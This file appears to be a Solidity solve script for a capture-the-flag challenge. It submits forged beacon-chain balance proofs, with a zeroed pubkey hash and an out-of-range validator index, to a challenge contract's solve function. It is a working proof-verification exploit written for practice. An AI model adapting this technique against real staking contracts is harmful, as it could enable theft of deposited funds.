// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-ctf/CTFSolver.sol";

import "src/Challenge.sol";

contract Solve is CTFSolver {
    function solve(address challengeAddress, address) internal override {
        Challenge challenge = Challenge(challengeAddress);

        bytes memory containerProof = hex"8e62516577f2f2ac2490ebb24b11d09e9ccc388e811aa0722658775be5f62659"
            hex"71081b10b416df001aadab095aec3edcfde577adbe4b97f3b3196cc9ec43fc37"
            hex"e4bd74f4dabe786197a1c149d5fc136130395235072694e9bd13e8907258f3cf"
            hex"6f60a6539083337b173b7714ed249f4847075444c6e0831a3c5118c21baff5d0"
            hex"3bfad0d1a0f1a8799c37766cf048c5994f3ed8c8641b3806fb16addc2f6ea979"
            hex"4070e1b50d305ff8b9154b706a3b2e9f5d16a4208e7a72b03925c03749847d3a"
            hex"4dbaca4bae64cec7342baa558300fdcc545cde619cad37caa4859cf076c6ed62"
            hex"6383adf9ba7ce6317b8f0d577546293bd4e7c83cbed40bcc3f87604e2d033bd6";

        BeaconChainProofs.BalanceContainerProof memory balanceContainerProof = BeaconChainProofs.BalanceContainerProof({
            balanceContainerRoot: bytes32(0x7699c057b2d65cebf5709a8492756e4c4f0a51c6c5de8b32b5b57e6d5397f497),
            proof: containerProof
        });

        bytes memory balanceProof = hex"b58d900f5e182e3c50ef74969ea16c7726c549757cc23523c369587da7293784"
            hex"d49a7502ffcfb0340b1d7885688500ca308161a7f96b62df9d083b71fcc8f2bb"
            hex"8fe6b1689256c0d385f42f5bbe2027a22c1996e110ba97c171d3e5948de92beb"
            hex"8d0d63c39ebade8509e0ae3c9c3876fb5fa112be18f905ecacfecb92057603ab"
            hex"95eec8b2e541cad4e91de38385f2e046619f54496c2382cb6cacd5b98c26f5a4"
            hex"f893e908917775b62bff23294dbbe3a1cd8e6cc1c35b4801887b646a6f81f17f"
            hex"cddba7b592e3133393c16194fac7431abf2f5485ed711db282183c819e08ebaa"
            hex"8a8d7fe3af8caa085a7639a832001457dfb9128a8061142ad0335629ff23ff9c"
            hex"feb3c337d7a51a6fbf00b9e34c52e1c9195c969bd4e7a0bfd51d5c5bed9c1167"
            hex"e71f0aa83cc32edfbefa9f4d3e0174ca85182eec9f3a09f6a6c0df6377a510d7"
            hex"31206fa80a50bb6abe29085058f16212212a60eec8f049fecb92d8c8e0a84bc0"
            hex"3e0c000000000000000000000000000000000000000000000000000000000000"
            hex"c3908973a37e035f12bf7d54c62efffba28f002136247bc450c804183a165a1d"
            hex"17d14f4e1ca3c58b4e6fdda42578771f54a2cc58e11b40a1d3033f0226f85325"
            hex"058e55ae79435686ee174de828c173a76e1f58905156ce21b0b2a403fe6f6149"
            hex"ffd79039fca42f0b786d3cc3c588bbb8714a3902d8a70f5f7f3438fc65596601"
            hex"5fe2ab16facfbe295a57619ec1100ba27d878fd860036194830a33516f851956"
            hex"2c69a7e4d6963e4d5795b3ef786faa5c74ff48683d2c8e0cf6fbb3db79c58f0b"
            hex"22cf34c0561f7e50cd17143985abd784c4922bdc703177fddd28b79697d5b7a9"
            hex"22851349e228c21b14e952ec46595b7777a2ad4fc277c39198519def853e1d37"
            hex"26846476fd5fc54a5d43385167c95144f2643f533cc85bb9d16b782f8d7db193"
            hex"506d86582d252405b840018792cad2bf1259f1ef5aa5f887e13cb2f0094f51e1"
            hex"ffff0ad7e659772f9534c195c815efc4014ef1e1daed4404c06385d11192e92b"
            hex"6cf04127db05441cd833107a52be852868890e4317e6a02ab47683aa75964220"
            hex"b7d05f875f140027ef5118a2247bbb84ce8f2f0f1123623085daf7960c329f5f"
            hex"df6af5f5bbdb6be9ef8aa618e4bf8073960867171e29676f8b284dea6a08a85e"
            hex"b58d900f5e182e3c50ef74969ea16c7726c549757cc23523c369587da7293784"
            hex"d49a7502ffcfb0340b1d7885688500ca308161a7f96b62df9d083b71fcc8f2bb"
            hex"8fe6b1689256c0d385f42f5bbe2027a22c1996e110ba97c171d3e5948de92beb"
            hex"8d0d63c39ebade8509e0ae3c9c3876fb5fa112be18f905ecacfecb92057603ab"
            hex"95eec8b2e541cad4e91de38385f2e046619f54496c2382cb6cacd5b98c26f5a4"
            hex"f893e908917775b62bff23294dbbe3a1cd8e6cc1c35b4801887b646a6f81f17f"
            hex"a900000000000000000000000000000000000000000000000000000000000000"
            hex"bf99797d6dde327cd3a947dba2c1b1c0b9865cfcf39c467d6da257d785644f6c"
            hex"3884781ec9b316014e9469f8a06c3e4c1bbee35f14463805c1dacaeb47ecb7be"
            hex"af7253c307b1fafb5b3ff33a7fc2f024e4d2898b5acb78e4cbe0b258e729b7a4"
            hex"f1771354435e8b5ebc10455a0ac57c5186edd4a09b873535d7efaebfdab73abc"
            hex"5d80341fcfec56168bcd2f63481bd340c610aea00600f6e996fdb141841fc2e9"
            hex"7b302c0700000000000000000000000000000000000000000000000000000000";

        BeaconChainProofs.BalanceProof memory bProof = BeaconChainProofs.BalanceProof({
            pubkeyHash: bytes32(0),
            balanceRoot: bytes32(0xb0c590de88c9a33490240914a99fda05555b512bd27a94c563154c5b09bbd8bc),
            proof: balanceProof
        });

        uint40 validatorIndex = 446676598784;
        uint64 beaconTimestamp = 1772288483;

        challenge.solve(beaconTimestamp, balanceContainerProof, validatorIndex, bProof);
    }
}
